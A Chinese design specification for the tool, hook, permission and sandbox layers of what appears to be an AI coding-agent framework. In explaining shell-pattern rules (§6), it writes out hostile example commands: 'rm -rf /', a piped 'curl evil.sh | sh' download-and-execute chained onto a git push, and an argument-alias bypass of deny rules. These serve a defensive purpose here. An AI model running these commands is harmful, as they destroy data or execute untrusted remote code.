# 工具与 Hooks 设计规范

> 本文是 `zhuye-tools` / `zhuye-hooks` 两个 crate 的设计契约文档,
> 源码 doc-comment 以 `§N.M` 形式引用本文章节。行为以代码为准,本文
> 与代码不一致时视为文档 bug,欢迎修文档或提 issue。

## 目录

- §1 工具总览与注册表分层
- §2 内置工具契约
- §3 工具执行队列与并发模型
- §4 Hook 事件与决策协议
- §5 内置 Hook 与配置 schema
- §6 权限模式
- §7 审批门(ApprovalGate)
- §8 沙箱
  - §8.1 OS 级沙箱(Seatbelt / Landlock)

---

## §1 工具总览与注册表分层

`Tool` trait(`zhuye-tools/src/tool.rs`)是所有工具的公共契约:
`name` / `description` / `parameters_schema`(JSON Schema 2020-12)/
`is_concurrency_safe` / `execute(ctx, args)`。

`ToolRegistry` 是一个扁平 `HashMap<String, (ToolSource, Arc<dyn Tool>)>`,
按注册来源分 5 类(不是分层查找):

| 来源 | 注册者 | 典型内容 |
|---|---|---|
| Builtin | 框架启动 | 内置工具(§2) |
| Runtime | 集成层 | `mcp__<server>__<tool>`(MCP)、`lsp`(LSP)、`ast`、`checkpoint` / `rewind` / `cron`(exec) |
| Plugin | 插件 lifecycle | 插件 manifest 声明的工具 |
| Mcp | MCP client | MCP server 暴露的工具 |
| Remote | serve 模式 | Python / TS SDK 注册的宿主语言函数 |

同名冲突时**后注册者覆盖**(`register` 直接覆写 HashMap 条目);
`register_if_absent` 则保留已有。安全下限:非 Builtin 来源会被
`FloorEnforcingTool` 包一层,强制 `required_permission >= Prompt`。

## §2 内置工具契约

通用约定:

- 路径参数(`file_path` / `path`)**一律**解析到 workspace 内,拒绝逃逸
  (`ToolError::PathEscape`)。`grep` / `glob` 的 `path`(搜索根目录)同样
  过 `resolve_sandbox_dir`,不是例外 —— 0.6 之前它俩直接把参数喂给
  `WalkBuilder`,可以遍历整个文件系统;
- `read` 前置 `FileReadStateTracker` 记录(§4.7),`edit` / `write` 前置
  `ReadBeforeEditHook`(§5)校验"先读后写";
- 工具输出统一 `ToolOutput { content, is_error, metadata, elapsed_ms }`。
  **各工具有各自的截断上限**(见下表),没有统一的 16 KiB 截断;
  16 KiB 是 rollout JSONL 单字段的落盘上限(`zhuye-rollout`),与工具
  输出无关。

| 工具 | 上限 | 超出后 |
|---|---|---|
| `bash` | 每流 100 KiB(合计再截 100 KiB) | 完整输出落盘临时文件,回传路径供 `read` 取回 |
| `read` | 2000 行(1000 头 + 1000 尾) | 中间插入省略标记 |
| `grep` | `max_results`(默认 100) | 报告 `truncated` + 省略计数 |
| `glob` | 1000 条 | 报告 `truncated` |
| `web_fetch` | body 5 MiB / markdown 50 KB | 报告 `body_truncated` / markdown 截断标记 |
| `web_search` | body 2 MiB / 输出 8 KB | 逐条累积到上限即停 |

所有按**字节**的截断都经 `zhuye_protocol::truncate_str` 做 char 边界
对齐(0.8):CJK 内容一个汉字 3 字节,直接 `String::truncate` / byte-slice
会在非边界处 panic。

各工具细节(源码 `crates/abilities/zhuye-tools/src/builtins/`):

- §2.2 `read`:offset / limit 分页;图片走 `image_view` 多模态块;
  notebook 用 `notebook_edit` 的 list / read action。`offset` / `limit`
  有 `maximum` 上界(0.9:此前 `offset + limit` 会回绕导致 slice panic),
  读入前还有 32 MiB 文件大小上限。
- §2.3 `write`:整文件覆写;先读后写校验;报告写入字节数。落盘为
  temp + rename 原子写;路径校验对相对路径同样生效(0.2:此前
  `if path.is_absolute()` 把相对 `..` 穿越整个漏掉)。
- §2.4 `edit`:`old_string` 精确匹配;多处命中报错;mtime 漂移超阈值拒写
  (防并发覆盖)。**不支持** `replace_all`(计划中的补齐项)。
- §2.5 `grep`:`ignore::WalkBuilder` 遍历 + regex;`rank_mode = bm25`
  时按 BM25 重排(反射 `zhuye-bm25`)。输出为相对 workspace 的路径。
- §2.6 `glob`:pattern / path;同样走 ignore 树(尊重 .gitignore)。
  当前实现是**路径子串匹配**(不是真 glob),排序按 mtime 倒序 +
  路径名字典序兜底。

其余:执行类 `bash`(timeout_ms / run_in_background)、`background_status`;
Web 类 `web_fetch`(SSRF 防护)/ `web_search`(Brave)/ `url_safety`;
计划类 `enter_plan_mode` / `exit_plan_mode` / `plan_write`;交互类
`ask_user` / `ask_user_question` / `request_human_input`;worktree 类
`enter_worktree` / `exit_worktree`;元工具 `tool_search` / `brief` /
`get_context_remaining` / `echo` / `delete_file` / `notebook_edit` /
`image_view`。

## §3 工具执行队列与并发模型

`ToolExecutionQueue`(`zhuye-tools/src/queue.rs`):

- `is_concurrency_safe() == true` 的工具(read / grep / glob / web 类)
  并发执行;unsafe 工具(bash / write / edit)**按提交顺序串行**,
  防止写写冲突;
- 队列消费 hook 决策:PreToolUse 的 `Deny` 直接转错误结果、
  `ModifyArgs` 替换入参、`PermissionOverride` 切换权限模式、
  `Ask` 路由到 ApprovalGate(§7);
- 取消:`CancellationToken` 级联(bash 子进程 kill、流中断)。

## §4 Hook 事件与决策协议

### §4.1 事件(12 类,`zhuye-hooks/src/event.rs`)

| 事件 | 触发点 | hook 可否决 |
|---|---|---|
| `PreToolUse` | 工具执行前 | 是(Deny / ModifyArgs / PermissionOverride / Ask) |
| `PostToolUse` | 工具成功后 | 否(审计) |
| `PostToolUseFailure` | 工具失败 / 超时后 | 否 |
| `Stop` | turn 结束前 | 是(Deny 强制续跑) |
| `SessionStart` | 会话启动,每线程一次 | 否 |
| `SessionEnd` | 会话结束(Op::Shutdown 或通道关闭),v1.6 | 否 |
| `UserPromptSubmit` | prompt 进模型前 | 是(Deny 拒整回合) |
| `PreCompact` | 压缩执行前 | 是(Deny 跳过本轮压缩) |
| `PostCompact` | 压缩完成后,v1.6 | 否(审计 / 恢复钩子) |
| `TaskCreated` / `TaskUpdated` / `TaskCompleted` | 任务板生命周期 | 否 |

`HookEvent` 不携带完整 `ToolContext`(避免 tools↔hooks 循环依赖),
需要上下文的事件提供精简 `HookContext { session_id, turn_id, workspace,
permission_mode }`。

### §4.2 决策(7 种,`decision.rs`)

`Allow` / `Deny { reason }` / `ModifyArgs(json)` /
`InjectMessage(SystemMessage)` / `PermissionOverride(PermissionMode)` /
`Ask { reason }`(转人工审批模态)/ `Combined(Vec)`(单 hook 返回多重
决策)。§4.5:`Combined` 经 `ResolvedDecision::resolve()` 规范化展平,
冲突时 **Deny > ModifyArgs > InjectMessage > Allow** 优先。

### §4.4 引擎合并优先级

`HookEngine::dispatch` 按注册顺序依次调用订阅了该事件的 hook,
合并规则:任一 Deny 即终局 Deny;多个 ModifyArgs 后者覆盖前者;
多个 InjectMessage 拼接;多个 Ask 以首个为准(避免连环弹窗)。

### §4.7 读状态跟踪(file_read_state.rs)

`FileReadStateTracker` 记录"哪些文件在何时以何 mtime 被读过",
供 `ReadBeforeEditHook`(§5)判定 edit/write 的 old_string 是否基于
新鲜内容;`DenyReason` 区分"从未读" / "已过期(mtime 漂移)"。

## §5 内置 Hook 与配置 schema

内置 hook(`zhuye-hooks/src/builtins/`):

- §5.1 `SearchBudgetHook`:单 turn 内 grep/glob 次数预算,超限注入提醒。
- §5.2 `TestRunnerHook`:PostToolUse(写类工具)后自动跑测试命令。
- §5.3 `PlanCompletionHook`:plan 模式下跟踪 `plan_write` 完成度。
- §5.4 `VerificationHook`:Stop 时跑验证命令,失败 Deny 强制续跑修复。
- `PlanModeGateHook`:plan 模式下 blanket-deny 写工具(见 PLAN_MODE.md)。
- `ReadBeforeEditHook`:先读后写强制(§4.7)。
- `LangfuseTrackerHook`:遥测埋点。

§5.5 配置 schema(`hooks.json` / config.toml `[hooks]`):数组,每项
`{ name, event, matcher?, command, timeout_ms? }`;`event` 为
§4.1 事件名的 snake_case;`matcher` 仅对带工具名的事件生效,支持
`*` / `?` 通配。`ShellHook`(shell.rs)把事件 JSON 写子进程 stdin,
stdout 回 JSON 决策(`{"decision":"deny","reason":"..."}` 等);
**fail-closed**:命令超时或非零退出视为 Deny。

## §6 权限模式

7 级(定义于 zhuye-protocol):`Auto` / `Prompt` / `Deny` / `Plan` /
`AcceptEdits` / `Bubble`(非阻塞通知)/ `Bypass`(静默全批)。
规则引擎见 `zhuye-permissions`(tool 精确名 + tool_glob + bash
shell_pattern,匹配上下文感知);bash 命令经 `classify_command` 三级
分类(Safe / Risky / Dangerous)供审批分级。

### shell_pattern 的语义(0.4)

`shell_pattern` 按 `&&` / `||` / `|` / `;` 切段后匹配,**匹配模式随
action 而变**:

- **`Deny` → 任一段命中即拦。** 漏一段就是真实漏洞,所以
  `deny = "rm -rf *"` 能拦住 `git status; rm -rf /`。
- **`Allow` / `Ask` → 所有段都命中才命中。** 否则
  `allow = "git push *"` 会把 `git push origin main && curl evil.sh | sh`
  整条放行(前一段匹配上,后两段搭便车)。

另外两条:

- `Deny` 规则在**无 bash 命令上下文**时 fail-closed 返回 `Deny`
  (此前是静默跳过,任何忘记传命令的调用点都会让 Deny 失效);
- `*` 默认跨 `/`(globset 默认行为)。这**不是** bug —— 关掉它会让
  `rm -rf *` 这种必须匹配任意目标路径的常见 pattern 失效,而切段已经
  解决了它想解决的问题。

### bash 命令参数的别名(0.3)

`bash` 工具的 schema 声明参数名是 `cmd`,但 `execute` 内部按
`cmd` → `command` → `cmdline` 顺序取首个非空字符串(弱模型常把命令放进
后两者)。**所有安全判定点都必须用
`zhuye_protocol::resolve_bash_command(args)`,不能只读 `args["cmd"]`** ——
否则模型发 `{"command": "rm -rf /"}` 时,`shell_pattern` 规则(含 Deny)、
`dangerous_bash` 基线、风险等级、Plan mode 判定全部静默失效。

该函数放在 `zhuye-protocol` 是因为 `zhuye-tools` 与
`zhuye-hooks` 是单向依赖,而被两边共用的规范化不能放在任一层
(与 `ToolError` 同一理由)。

## §7 审批门(ApprovalGate)

`zhuye-tools/src/approval/gate.rs`:`ask` 发出
`EventMsg::ApprovalRequest`,等待 `Op::ToolApproval` 回执;支持
ApproveForSession(会话内记忆)。hook 的 `Ask` 决策同样路由到此处
(`ApprovalKind::Hook`)。

## §7.5 Plan mode

`--plan-mode` 的强制力来自 `PlanModeGate`(PreToolUse hook 把白名单外
工具 blanket-deny),**不是** `PermissionMode::Plan` —— 后者只让审批层
知道当前模式,单独存在时写工具照样放行。三个入口都必须同时做两件事:

| 入口 | permission mode | PlanModeGate |
|---|---|---|
| `zhuye exec`(普通) | `headless.rs` `bootstrap_normal` | 同上 |
| `zhuye exec --resume`(0.5 前缺失) | `headless.rs` `bootstrap_resumed` | 同上 |
| `ZhuyeBuilder::plan_mode(true)` / zhuye-py(0.5 前缺失) | `builder.rs` | 同上 |

`zhuye exec --plan-mode` 的退出码:**122 = 计划生成失败需重试**
(turn 结束仍未见过 `PlanReady` / `PlanApproved` 事件);0 = 正常产出计划。
普通 headless 调用不受影响。

## §8 沙箱

### §8.1 OS 级沙箱(Seatbelt / Landlock)

`zhuye-sandbox/src/os_sandbox.rs`:macOS Seatbelt(profile 级策略,
workspace-write 默认)/ Linux Landlock(路径白名单)。bash 工具的
`sandbox` 参数启用;策略与权限模式正交(见 §6)。网络隔离目前仅
`web_fetch` 层实施(SSRF 防护:私有网段 / 逐跳 redirect 校验)。

### §8.2 Linux Landlock 的 handled 位集合(0.1)

Landlock 只对 `handled_access_fs` 里列出的 access right 施加限制;
workspace(及额外可写目录)通过 `landlock_add_rule` 放行。设计决策是
**只限制写类操作,读 / exec 完全不受限** —— 编译 / 分析常需读系统头与
依赖,限制读会大面积破坏可用性。

位集合是 `0x1ff2`(`WRITE_FILE | REMOVE_DIR | REMOVE_FILE | MAKE_CHAR |
MAKE_DIR | MAKE_REG | MAKE_SOCK | MAKE_FIFO | MAKE_BLOCK | MAKE_SYM`),
由命名常量逐个 OR 组合 + 编译期 `assert!` 守护。**不要**手写字面量:
0.1 之前这里写作 `0xffe`,多含了 `READ_FILE` / `READ_DIR`(→ workspace
外的读被内核拒,`execve` 时动态链接器读不到 `/usr/lib`,表现为
`spawn failed: EACCES`),又漏了 `MAKE_SYM`(→ workspace 外的符号链接
创建完全不受限)。

### §8.3 strict 模式与降级(0.1)

`OsSandbox::default()` = `enabled + strict`。`enforce_or_fail()` 在
strict + 后端不可用时返回 `Err`,BashTool 据此抛
`ToolError::SandboxUnavailable` 而**不是**裸执行。

- `strict = true`(默认):权限类 spawn 失败(EACCES / EPERM)直接
  fail-closed,**绝不**降级为无沙箱执行。Linux 上 `enforce_or_fail`
  还会做一次非破坏性内核探测(`landlock_create_ruleset` 空调用),
  拦住"内核完全没有 Landlock"这类假阳性。
- `strict = false`:保留降级语义(重建 command 去掉 `pre_exec` 重试一次),
  并打 `warn!`。用 `ZHUYE_SANDBOX_STRICT=0` 或 `ZHUYE_SANDBOX_OS_LEVEL=0`
  显式开启。

`status_line()` 对网络边界**按 backend 如实报告**:Seatbelt 真发
`(deny network*)`;Landlock 的 `handled_access_net` 恒为 0,所以标
"网络:不受沙箱约束"而不是"网络:拒绝"。
